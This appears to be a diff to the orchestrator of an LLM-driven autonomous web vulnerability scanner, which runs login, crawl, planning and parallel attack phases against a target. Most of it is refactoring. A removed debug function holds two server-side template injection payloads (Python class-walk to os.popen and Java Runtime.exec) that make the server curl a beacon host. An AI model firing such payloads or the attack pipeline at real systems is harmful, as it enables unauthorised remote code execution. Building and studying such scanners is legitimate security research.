@@ -23,7 +23,7 @@ from plan_agent.task_planning_agent import TaskPlanningAgent
 from plan_agent.attack_planning_agent import AttackPlanningAgent
 from attack_agent.attack_executor import AttackExecutor
 from utils.token_tracker import tracker
-# 🆕 No longer import specific agent classes (now created on-demand in AttackExecutor)
+# No longer import specific agent classes (now created on-demand in AttackExecutor)
 
 # Monkey patch to modify the original get method, avoiding old timeout errors that terminate the program
 # Save the original get method
@@ -73,7 +73,7 @@ class HighLevelDecisionAgent:
                  output_dir: str = "output",
                  chrome_options = None,
                  config: Optional[Dict] = None,
-                 target_domain: Optional[str] = None):  # 🆕 New parameter
+                 target_domain: Optional[str] = None):  # New parameter
         """
         Initialize the top-level decision agent.
 
@@ -91,7 +91,6 @@ class HighLevelDecisionAgent:
                 - task_planning_max_iterations: Maximum task planning iterations (default 200, previously 100)
                 - task_planning_max_workers: Number of parallel workers for task execution (default 5)
                 - attack_planning_max_iterations: Maximum attack planning iterations (default 100)
-                - attack_planning_mode: Attack planning mode: "llm" (LLM intelligent planning, default) or "exhaustive" (exhaustive testing, for ablation experiments)
                 - attack_execution_max_workers: Number of parallel workers for attack execution (default 10)
         """
         self.client = client
@@ -100,7 +99,7 @@ class HighLevelDecisionAgent:
         self.crawl_start_url = crawl_start_url
         self.output_dir = Path(output_dir)
         self.chrome_options = chrome_options
-        # 🆕 Determine target domain (prefer the passed-in value, otherwise extract from initial_url)
+        # Determine target domain (prefer the passed-in value, otherwise extract from initial_url)
         if target_domain:
             self.target_domain = target_domain
             print(f"[DecisionAgent] Using provided target domain: {self.target_domain}")
@@ -122,7 +121,6 @@ class HighLevelDecisionAgent:
 
             # Phase 4: Attack Planning
             "attack_planning_max_iterations": 100,
-            "attack_planning_mode": "llm",  # 🆕 Attack planning mode: "llm" (intelligent planning) or "exhaustive" (exhaustive testing)
 
             # Phase 5: Attack Execution
             "attack_execution_max_workers": 10,
@@ -179,7 +177,7 @@ class HighLevelDecisionAgent:
         self.task_planner = None
         self.attack_planner = None
         self.executor = None
-        # 🆕 Save worker drivers (passed from Task Planning to Attack phase)
+        # Save worker drivers (passed from Task Planning to Attack phase)
         self.worker_drivers = []
 
         # Timing statistics
@@ -208,7 +206,7 @@ class HighLevelDecisionAgent:
         """Execute the complete automated testing workflow"""
         try:
             self._log("\n" + "="*70)
-            self._log("🚀 Starting Autonomous Security Testing Framework")
+            self._log("Starting Autonomous Security Testing Framework")
             self._log("="*70)
             self._log(f"Target URL: {self.initial_url}")
             if self.login_task:
@@ -220,22 +218,14 @@ class HighLevelDecisionAgent:
             # Initialize driver
             self._init_driver()
 
-            # ✅ Initialize crawler early (Phase 1 needs crawler.run_a_task to execute login task)
+            # Initialize crawler early (Phase 1 needs crawler.run_a_task to execute login task)
             self.crawler = Crawler(
                 driver=self.driver,
                 client=self.client,
                 initial_url=self.initial_url,
-                target_domain=self.target_domain, # 🆕 Pass parameter
+                target_domain=self.target_domain, # Pass parameter
                 store_root=str(self.dirs["crawl"])
             )
-
-            # 2. Test xss() function
-            # Send a signature string "TEST_INIT_BEACON"
-            # self._log(f"[DEBUG] Executing browser-side JS: xss()")
-            # self.driver.get(self.initial_url)
-            # # execute_script here is synchronous; if xss function has issues it will throw directly
-            # self.driver.execute_script("xss(4244564)")
-            # self._log(f"[DEBUG] Browser-side JS execution complete")
 
             # Phase 1: Execute login (if login_task is provided)
             if self.login_task:
@@ -244,19 +234,13 @@ class HighLevelDecisionAgent:
                 self._log("\n[Phase 1] Skipping login, proceeding directly to crawl phase")
                 self.state["login_complete"] = False
 
-            # ✅ DEBUG: Replay commands (comment out the line below when not needed)
-            # self._debug_replay_commands()
-
-            # ✅ TEST: Test independent driver creation (comment out the line below after verification)
-            # self._test_create_cloned_drivers()
-
             # Phase 2: Deep crawl (reuse the already created crawler)
             self._phase_2_crawl()
 
             # Phase 3: Task planning
             self._phase_3_task_planning()
 
-            # 🆕 Phase 4+5: Pipeline parallel attack (replaces the original Phase 4 and Phase 5)
+            # Phase 4+5: Pipeline parallel attack (replaces the original Phase 4 and Phase 5)
             self._phase_4_5_pipeline_attack()
 
             # Generate final report
@@ -278,7 +262,7 @@ class HighLevelDecisionAgent:
             }
 
         except Exception as e:
-            self._log(f"\n❌ Testing workflow exception: {e}")
+            self._log(f"\nTesting workflow exception: {e}")
             import traceback
             self._log(traceback.format_exc())
             raise
@@ -313,10 +297,12 @@ class HighLevelDecisionAgent:
 
         self.driver.request_interceptor = interceptor
 
-        # ✅ Inject XSS detection script (critical fix)
-        self.driver.add_script( open("js/xss_xhr.js", "r").read() )
+        # Inject XSS detection script with beacon URL
+        from config.llm_config import BEACON_URL
+        xss_script = open("js/xss_xhr.js", "r").read().replace("{BEACON_URL}", BEACON_URL.rstrip("/"))
+        self.driver.add_script(xss_script)
 
-        # ✅ Inject event listener capture script (new)
+        # Inject event listener capture script (new)
         # Note: lib.js must be loaded before addeventlistener_wrapper.js
         self.driver.add_script( open("js/md5.js", "r").read() )
         self.driver.add_script( open("js/lib.js", "r").read() )
@@ -336,7 +322,7 @@ class HighLevelDecisionAgent:
         self._log(f"Task description: {self.login_task}")
 
         try:
-            # ✅ Fix: Initialize AccountManager (using correct parameters)
+            # Initialize AccountManager (using correct parameters)
             if not self.account_manager:
                 self.account_manager = AccountManager(
                     store_path=str(self.output_dir / "accounts.json"),
@@ -355,15 +341,15 @@ class HighLevelDecisionAgent:
                 initial_url=self.initial_url
             )
 
-            # ✅ Save task object (used for Phase 5 login recovery)
+            # Save task object (used for Phase 5 login recovery)
             self.login_task_object = task
 
-            # ✅ Fix: Execute login (using crawler.run_a_task)
+            # Execute login (using crawler.run_a_task)
             self._log("\n[Execute Login Task]")
             tracker.set_category("login_bridge")
             self.crawler.run_a_task(task, logging_in=True)
 
-            # ✅ Extract credentials and create default_account
+            # Extract credentials and create default_account
             self._log("\n[Create default_account]")
             time.sleep(1)  # Wait for page to stabilize
             credentials = self.account_manager._extract_credentials(self.driver)
@@ -386,10 +372,10 @@ class HighLevelDecisionAgent:
             self.phase_times["phase_1_login"] = phase_duration
 
             self._log(f"\n[Phase 1 Complete] Login successful")
-            self._log(f"⏱️  Duration: {phase_duration:.1f}s")
+            self._log(f" Duration: {phase_duration:.1f}s")
 
         except Exception as e:
-            self._log(f"\n❌ Login failed: {e}")
+            self._log(f"\nLogin failed: {e}")
             import traceback
             self._log(traceback.format_exc())
             raise
@@ -425,7 +411,7 @@ class HighLevelDecisionAgent:
 
         self._log(f"Start URL: {start_url}")
 
-        # ✅ Fix: crawler was already created in run(), just need to update initial_url here
+        # crawler was already created in run(), just need to update initial_url here
         # If start URL differs from creation time, update crawler's initial_url
         if start_url != self.crawler.initial_url:
             self._log(f"[Update crawler start URL] {self.crawler.initial_url} -> {start_url}")
@@ -444,7 +430,7 @@ class HighLevelDecisionAgent:
             output_path=str(self.dirs["crawl"] / "task_plan_graph.json")
         )
 
-        # ✅ If not logged in (unauthenticated scenario), create default_account
+        # If not logged in (unauthenticated scenario), create default_account
         if not self.state.get("login_complete", False):
             self._log("\n[Create default_account (unauthenticated scenario)]")
 
@@ -478,7 +464,7 @@ class HighLevelDecisionAgent:
         self.phase_times["phase_2_crawl"] = phase_duration
 
         self._log(f"\n[Phase 2 Complete] Discovered {self.state['pages_count']} pages")
-        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
+        self._log(f" Duration: {phase_duration:.1f}s")
 
     def _phase_3_task_planning(self, use_parallel: bool = True):
         """
@@ -535,7 +521,7 @@ class HighLevelDecisionAgent:
                 # Count results
                 total_tasks = result.get("total_pages", 0)  # Parallel mode returns the number of pages executed
 
-                # 🆕 Save worker drivers (don't destroy, pass to Attack phase)
+                # Save worker drivers (don't destroy, pass to Attack phase)
                 self.worker_drivers = scheduler.get_worker_drivers()
                 self._log(f"\n[Worker Drivers] Saved {len(self.worker_drivers)} driver(s) for attack phase")
 
@@ -570,11 +556,11 @@ class HighLevelDecisionAgent:
         self.phase_times["phase_3_task_planning"] = phase_duration
 
         self._log(f"\n[Phase 3 Complete] Tasks/pages executed: {total_tasks}")
-        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
+        self._log(f" Duration: {phase_duration:.1f}s")
 
     def _phase_4_5_pipeline_attack(self):
         """
-        🆕 Phase 4+5: Pipeline parallel attack (Attack Planning + Execution Pipeline)
+        Phase 4+5: Pipeline parallel attack (Attack Planning + Execution Pipeline)
 
         Improvements:
         - Phase 4 and Phase 5 run simultaneously
@@ -598,30 +584,16 @@ class HighLevelDecisionAgent:
 
         task_queue = queue.Queue(maxsize=100)  # Limit queue size to avoid memory overflow
 
-        # ⚠️ Disabled: periodic keep-alive thread (because each task already has a keep-alive operation at start)
-        # 🆕 Start Session keep-alive thread (keep main driver's session active)
-        # from utils.session_keepalive import SessionKeepAliveThread
-
-        # keepalive_thread = SessionKeepAliveThread(
-        #     driver=self.driver,
-        #     initial_url=self.crawler.initial_url,  # 🆕 Fixed: visit the post-login initial page
-        #     screenshot_dir=str(self.dirs["attack_execution"] / "session_keepalive"),
-        #     interval=60  # Visit a random page every 60 seconds
-        # )
-        # keepalive_thread.start()
-        # self._log("[KeepAlive] Session keep-alive thread started (visits initial page and takes screenshot every 60s)\n")
-
         # Create AttackPlanningAgent
         self.attack_planner = AttackPlanningAgent(
             client=self.client,
             crawler=self.crawler,
             account_manager=self.account_manager,
             ctf_description=None,
-            default_account="default_account",
-            planning_mode=self.config["attack_planning_mode"]  # 🆕 Pass planning mode
+            default_account="default_account"
         )
 
-        # ✅ Start Phase 4 planning thread (producer)
+        # Start Phase 4 planning thread (producer)
         def planning_worker():
             """Planning thread: continuously generates tasks and puts them into the queue"""
             try:
@@ -641,8 +613,8 @@ class HighLevelDecisionAgent:
         planning_thread.start()
         self._log("[Phase 4 Thread] Planning thread started\n")
 
-        # ✅ Phase 5 executes in main thread (consumer)
-        # 🆕 No longer pre-create agent instances (now created on-demand in AttackExecutor)
+        # Phase 5 executes in main thread (consumer)
+        # No longer pre-create agent instances (now created on-demand in AttackExecutor)
         # Create AttackExecutor
         from attack_agent.attack_executor import AttackExecutor
 
@@ -651,17 +623,16 @@ class HighLevelDecisionAgent:
             crawler=self.crawler,
             client=self.client,
             driver=self.driver,
-            beacon_base="http://172.17.0.1:9091/",  # 🆕 Unified beacon URL
             log_dir=str(self.dirs["attack_execution"]),
             edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
-            worker_drivers=self.worker_drivers,  # 🆕 Pass worker drivers
-            chrome_options=self.chrome_options,  # 🆕 Pass chrome options (for creating drivers)
-            initial_url=self.crawler.initial_url,  # 🔧 Fix: Pass the post-login page URL (for login check)
-            login_task=getattr(self, 'login_task_object', None),  # ✅ Fix: Pass Task object instead of string
-            target_domain=self.target_domain  # ✅ Add this critical parameter!
+            worker_drivers=self.worker_drivers,
+            chrome_options=self.chrome_options,
+            initial_url=self.crawler.initial_url,
+            login_task=getattr(self, 'login_task_object', None),
+            target_domain=self.target_domain
         )
 
-        # ✅ Execute tasks (consume from queue)
+        # Execute tasks (consume from queue)
         self._log("[Phase 5 Main Thread] Starting attack execution from queue...\n")
         try:
             execution_results = self.executor.execute_tasks_from_queue(
@@ -669,27 +640,21 @@ class HighLevelDecisionAgent:
                 max_workers=self.config["attack_execution_max_workers"]
             )
         except KeyboardInterrupt:
-            self._log("\n⚠️  Phase 4+5 interrupted by user (Ctrl+C)")
+            self._log("\n Phase 4+5 interrupted by user (Ctrl+C)")
             execution_results = getattr(self.executor, 'results', [])
         finally:
             # Regardless of normal completion or Ctrl+C, immediately record attack phase time
             attack_duration = getattr(self.executor, '_phase1_duration', time.time() - phase_start)
             self.phase_times["phase_4_5_attack"] = attack_duration
-            self._log(f"\n⏱️  Attack planning+execution duration: {attack_duration:.1f}s")
+            self._log(f"\n Attack planning+execution duration: {attack_duration:.1f}s")
 
-        # ✅ Wait for planning thread to complete
+        # Wait for planning thread to complete
         self._log("\n[Main Thread] Waiting for planning thread to finish...")
         planning_thread.join(timeout=300)  # Wait up to 5 minutes
         if planning_thread.is_alive():
             self._log("[Main Thread] Warning: Planning thread still running after 5 minutes")
         else:
             self._log("[Main Thread] Planning thread finished")
-
-        # ⚠️ Disabled: stop periodic keep-alive thread
-        # 🆕 Stop Session keep-alive thread
-        # self._log("\n[KeepAlive] Stopping session keep-alive thread...")
-        # keepalive_thread.stop()
-        # self._log("[KeepAlive] Session keep-alive thread stopped\n")
 
         # Count vulnerabilities
         vulnerabilities = sum(
@@ -714,123 +679,10 @@ class HighLevelDecisionAgent:
         self.phase_times["phase_4_5_patrol"] = patrol_duration
 
         self._log(f"\n[Phase 4+5 Complete] Vulnerabilities found: {vulnerabilities}")
-        self._log(f"⏱️  Attack planning+execution duration: {attack_duration:.1f}s")
-        self._log(f"⏱️  Stored vulnerability patrol duration: {patrol_duration:.1f}s")
-        self._log(f"⏱️  Total duration: {phase_duration:.1f}s")
-        self._log(f"💡 Performance improvement: Pipeline parallel mode significantly reduces testing time")
-
-        # Save results for report use
-        self.execution_results = execution_results
-
-    def _phase_4_attack_planning(self):
-        """
-        ⚠️  Deprecated: Please use _phase_4_5_pipeline_attack()
-
-        Phase 4: Attack planning (standalone execution mode)
-        """
-        phase_start = time.time()
-
-        self._log("\n" + "="*70)
-        self._log("Phase 4: Attack Planning")
-        self._log("="*70)
-
-        # Create AttackPlanningAgent
-        self.attack_planner = AttackPlanningAgent(
-            client=self.client,
-            crawler=self.crawler,
-            account_manager=self.account_manager,
-            ctf_description=None,
-            default_account="default_account",
-            planning_mode=self.config["attack_planning_mode"]  # 🆕 Pass planning mode
-        )
-
-        # Execute attack planning
-        result = self.attack_planner.plan_and_execute()
-
-        # Save results
-        serialized_tasks = [
-            {
-                "task_id": task.task_id,
-                "task_description": task.task_description,
-                "vuln_type": task.vuln_type,
-                "target_request": task.target_request,
-                "account_identifier": task.account_identifier
-            }
-            for task in result['all_tasks']
-        ]
-
-        with open(self.dirs["attack_planning"] / "attack_tasks.json", 'w', encoding='utf-8') as f:
-            json.dump(serialized_tasks, f, indent=2, ensure_ascii=False)
-
-        # Update state
-        self.state["attack_planning_complete"] = True
-        self.state["attacks_planned"] = len(result['all_tasks'])
-        self.state["current_phase"] = "attack_planning_complete"
-        self._save_state()
-
-        phase_duration = time.time() - phase_start
-        self.phase_times["phase_4_attack_planning"] = phase_duration
-
-        self._log(f"\n[Phase 4 Complete] Attack tasks generated: {len(result['all_tasks'])}")
-        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
-
-        # Save attack_planner results for later use
-        self.attack_tasks = result['all_tasks']
-
-    def _phase_5_attack_execution(self):
-        """Phase 5: Attack execution (🆕 parallel mode)
-
-        ⚠️  Deprecated: Recommend using _phase_4_5_pipeline_attack() pipeline mode
-        """
-        phase_start = time.time()
-
-        self._log("\n" + "="*70)
-        self._log("Phase 5: Attack Execution (PARALLEL MODE)")
-        self._log("="*70)
-
-        # 🆕 No longer pre-create agent instances (now created on-demand in AttackExecutor)
-        # Create AttackExecutor
-        self.executor = AttackExecutor(
-            account_manager=self.account_manager,
-            crawler=self.crawler,
-            client=self.client,
-            driver=self.driver,
-            beacon_base="http://172.17.0.1:9091/",
-            log_dir=str(self.dirs["attack_execution"]),
-            edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
-            worker_drivers=self.worker_drivers,  # 🆕 Pass worker drivers (supported even in old method)
-            chrome_options=self.chrome_options,  # 🆕 Pass chrome options
-            initial_url=self.crawler.initial_url,  # 🔧 Fix: Pass the post-login page URL (for login check)
-            login_task=self.login_task,          # 🆕 Pass login task
-            target_domain=self.target_domain  # ✅ Add this critical parameter!
-        )
-
-        # 🆕 Use parallel execution method
-        self._log(f"\n[Parallel Execution Mode] Max concurrency: {self.config['attack_execution_max_workers']}")
-        self._log(f"[Total Tasks] {len(self.attack_tasks)}")
-        execution_results = self.executor.execute_tasks_parallel(
-            self.attack_tasks,
-            max_workers=self.config["attack_execution_max_workers"]
-        )
-
-        # Count vulnerabilities
-        vulnerabilities = sum(
-            1 for r in execution_results
-            if r.get('result', {}).get('vulnerable') is True
-        )
-
-        # Update state
-        self.state["attack_execution_complete"] = True
-        self.state["vulnerabilities_found"] = vulnerabilities
-        self.state["current_phase"] = "attack_execution_complete"
-        self._save_state()
-
-        phase_duration = time.time() - phase_start
-        self.phase_times["phase_5_attack_execution"] = phase_duration
-
-        self._log(f"\n[Phase 5 Complete] Vulnerabilities found: {vulnerabilities}")
-        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
-        self._log(f"💡 Performance improvement: Parallel mode significantly reduces testing time")
+        self._log(f" Attack planning+execution duration: {attack_duration:.1f}s")
+        self._log(f" Stored vulnerability patrol duration: {patrol_duration:.1f}s")
+        self._log(f" Total duration: {phase_duration:.1f}s")
+        self._log(f"Performance improvement: Pipeline parallel mode significantly reduces testing time")
 
         # Save results for report use
         self.execution_results = execution_results
@@ -898,250 +750,8 @@ class HighLevelDecisionAgent:
         self.phase_times["report_generation"] = phase_duration
 
         self._log(f"\n[Report Generation Complete] Report saved: {report_path}")
-        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
+        self._log(f" Duration: {phase_duration:.1f}s")
 
-
-    def _debug_replay_commands(self):
-        """
-        Debug function: replay specified curl commands (for testing).
-
-        Usage:
-        1. Modify the commands in the debug_commands list
-        2. Call this function before crawling in run()
-        3. Simply comment out the call when not needed
-        """
-        self._log("\n" + "="*70)
-        self._log("[DEBUG] Replaying Commands")
-        self._log("="*70)
-
-        # ✅ Define the list of commands to replay here
-        debug_commands = [
-        "curl -s 'http://127.0.0.1:4288/Users/{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl http://172.17.0.1:9091/?data=loudongyanzheng').read()}}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
-        "curl -s 'http://127.0.0.1:4288/Users/${T(java.lang.Runtime).getRuntime().exec('curl http://172.17.0.1:9091/?data=loudongyanzheng')}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
-        ]
-
-        # ✅ Type check: ensure each element is a string
-        flattened_commands = []
-        for item in debug_commands:
-            if isinstance(item, list):
-                # If nested list, flatten it
-                flattened_commands.extend(item)
-            elif isinstance(item, str):
-                flattened_commands.append(item)
-            else:
-                self._log(f"[DEBUG] ⚠️  Skipping invalid item type: {type(item)}")
-
-        if not flattened_commands:
-            self._log("[DEBUG] ✗ No valid commands after flattening")
-            return
-
-        # Get credentials from default_account
-        if not self.account_manager:
-            self._log("[DEBUG] ✗ AccountManager not initialized")
-            return
-
-        credentials = self.account_manager.get_credentials("default_account")
-        if not credentials:
-            self._log("[DEBUG] ✗ No credentials found for default_account")
-            return
-
-        self._log(f"[DEBUG] ✓ Credentials obtained for default_account")
-        self._log(f"[DEBUG] Replaying {len(flattened_commands)} command(s)\n")
-
-        # Import necessary functions
-        from attack_agent.request_utils import append_credentials_to_curl
-        import subprocess
-
-        # Execute each command
-        for idx, cmd in enumerate(flattened_commands, 1):
-            # ✅ Confirm type again
-            if not isinstance(cmd, str):
-                self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}] ✗ Invalid type: {type(cmd)}, skipping")
-                continue
-
-            self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}]")
-            cmd_preview = cmd[:100] + "..." if len(cmd) > 100 else cmd
-            self._log(f"  Original: {cmd_preview}")
-
-            # Add credentials
-            try:
-                cmd_with_creds = append_credentials_to_curl(cmd, credentials)
-                creds_preview = cmd_with_creds[:150] + "..." if len(cmd_with_creds) > 150 else cmd_with_creds
-                self._log(f"  With Credentials: {creds_preview}")
-            except Exception as e:
-                self._log(f"  ✗ Failed to add credentials: {e}")
-                continue
-
-            # Execute command
-            try:
-                process = subprocess.Popen(
-                    cmd_with_creds,
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True
-                )
-                stdout, stderr = process.communicate(timeout=15)
-
-                self._log(f"  ✓ Executed (status={process.returncode})")
-                self._log(f"  [STDOUT length: {len(stdout)}]")
-                if stdout:
-                    preview = stdout[:500] if len(stdout) > 500 else stdout
-                    self._log(f"  [STDOUT preview]: {preview}")
-                    if len(stdout) > 500:
-                        self._log(f"  ... (truncated, total {len(stdout)} chars)")
-
-                if stderr:
-                    self._log(f"  [STDERR]: {stderr[:200]}")
-
-            except subprocess.TimeoutExpired:
-                self._log(f"  ✗ Timeout after 15s")
-            except Exception as e:
-                self._log(f"  ✗ Error: {e}")
-
-            self._log("")
-
-        self._log("="*70)
-        self._log(f"[DEBUG] Replay Complete - {len(flattened_commands)} command(s) processed\n")
-
-    def _test_create_cloned_drivers(self):
-        """
-        Test function: verify independent driver creation and state cloning.
-
-        Test steps:
-        1. Get main driver's current URL (post-login URL)
-        2. Create 3 independent drivers
-        3. Have each independent driver visit the main driver's current URL
-        4. Take screenshots to verify all can access correctly (without re-login)
-        5. Clean up all independent drivers
-
-        Usage:
-        - Call this function after Phase 1 in run()
-        - Check screenshots to confirm login state was correctly cloned
-        - Comment out after verification
-        """
-        self._log("\n" + "="*70)
-        self._log("[TEST] Testing independent driver creation")
-        self._log("="*70)
-
-        # Import ParallelDriverManager
-        try:
-            from parallel.parallel_driver_manager import ParallelDriverManager
-        except ImportError as e:
-            self._log(f"[TEST] ✗ Import failed: {e}")
-            self._log("[TEST] Please ensure parallel/parallel_driver_manager.py exists")
-            return
-
-        # Check main driver and account_manager
-        if not self.driver:
-            self._log("[TEST] ✗ Main driver not initialized")
-            return
-
-        if not self.account_manager:
-            self._log("[TEST] ✗ AccountManager not initialized")
-            return
-
-        # Get main driver current URL
-        current_url = self.driver.current_url
-        self._log(f"[TEST] Main driver current URL: {current_url}")
-
-        # Create test screenshot directory
-        test_screenshot_dir = self.output_dir / "test_parallel_drivers"
-        test_screenshot_dir.mkdir(parents=True, exist_ok=True)
-        self._log(f"[TEST] Screenshot save directory: {test_screenshot_dir}")
-
-        # Main driver screenshot (comparison baseline)
-        main_screenshot_path = test_screenshot_dir / "00_main_driver.png"
-        try:
-            self.driver.save_screenshot(str(main_screenshot_path))
-            self._log(f"[TEST] ✓ Main driver screenshot saved: {main_screenshot_path.name}")
-        except Exception as e:
-            self._log(f"[TEST] ⚠️ Main driver screenshot failed: {e}")
-
-        # Create ParallelDriverManager
-        self._log(f"\n[TEST] Creating ParallelDriverManager...")
-        try:
-            manager = ParallelDriverManager(
-                account_manager=self.account_manager,
-                base_url=self.initial_url,
-                chrome_options=self.chrome_options,
-                target_domain=self.target_domain
-            )
-            self._log(f"[TEST] ✓ ParallelDriverManager created successfully")
-        except Exception as e:
-            self._log(f"[TEST] ✗ ParallelDriverManager creation failed: {e}")
-            import traceback
-            self._log(traceback.format_exc())
-            return
-
-        # Test creating 3 independent drivers
-        test_drivers = []
-        num_drivers = 3
-
-        self._log(f"\n[TEST] Creating {num_drivers} independent drivers...\n")
-
-        for i in range(1, num_drivers + 1):
-            self._log(f"{'='*60}")
-            self._log(f"[TEST] Creating independent driver #{i}")
-            self._log(f"{'='*60}")
-
-            try:
-                # Create cloned driver
-                cloned_driver = manager.create_cloned_driver("default_account")
-                test_drivers.append(cloned_driver)
-
-                # Navigate to main driver's current URL
-                self._log(f"[TEST Driver-{i}] Navigating to target URL: {current_url}")
-                cloned_driver.get(current_url)
-                time.sleep(1.0)  # wait for page to load
-
-                actual_url = cloned_driver.current_url
-                self._log(f"[TEST Driver-{i}] Actual URL: {actual_url}")
-
-                # Check if redirected to login page
-                if 'login' in actual_url.lower() and 'login' not in current_url.lower():
-                    self._log(f"[TEST Driver-{i}] ⚠️ Warning: redirected to login page!")
-                    self._log(f"[TEST Driver-{i}] This may mean login state was not correctly cloned")
-                else:
-                    self._log(f"[TEST Driver-{i}] ✓ URL correct, not redirected")
-
-                # Take screenshot
-                screenshot_path = test_screenshot_dir / f"0{i}_cloned_driver_{i}.png"
-                cloned_driver.save_screenshot(str(screenshot_path))
-                self._log(f"[TEST Driver-{i}] ✓ Screenshot saved: {screenshot_path.name}")
-
-                self._log(f"[TEST Driver-{i}] ✅ Driver #{i} test complete\n")
-
-            except Exception as e:
-                self._log(f"[TEST Driver-{i}] ✗ Failed: {e}")
-                import traceback
-                self._log(traceback.format_exc())
-
-        # Summarize test results
-        self._log(f"\n{'='*70}")
-        self._log(f"[TEST] Test summary")
-        self._log(f"{'='*70}")
-        self._log(f"Successfully created drivers: {len(test_drivers)}/{num_drivers}")
-        self._log(f"Screenshot location: {test_screenshot_dir}")
-        self._log(f"\nPlease check the following screenshot files:")
-        self._log(f"  - 00_main_driver.png (main driver, comparison baseline)")
-        for i in range(1, len(test_drivers) + 1):
-            self._log(f"  - 0{i}_cloned_driver_{i}.png (independent driver {i})")
-
-        # Clean up all independent drivers
-        self._log(f"\n[TEST] Cleaning up independent drivers...")
-        manager.cleanup_all()
-
-        self._log(f"{'='*70}")
-        self._log(f"[TEST] Test complete!")
-        self._log(f"{'='*70}\n")
-
-        # Important notes
-        self._log("⚠️  Important: check screenshot files and confirm the following:")
-        self._log("   1. Is the page content consistent across all screenshots?")
-        self._log("   2. Do independent drivers show the post-login page (not the login page)?")
-        self._log("   3. Are there any error messages or abnormal pages?")
-        self._log("\n   If all screenshots look correct, independent driver state cloning succeeded!\n")
 
     def _cleanup(self):
         """Clean up resources"""
@@ -1150,7 +760,7 @@ class HighLevelDecisionAgent:
         # Output per-phase timing summary regardless of normal or interrupted exit
         if self.phase_times:
             self._log("\n" + "="*70)
-            self._log("⏱️  Per-phase timing summary")
+            self._log(" Per-phase timing summary")
             self._log("="*70)
             for phase, duration in self.phase_times.items():
                 self._log(f"  {phase}: {duration:.1f}s")
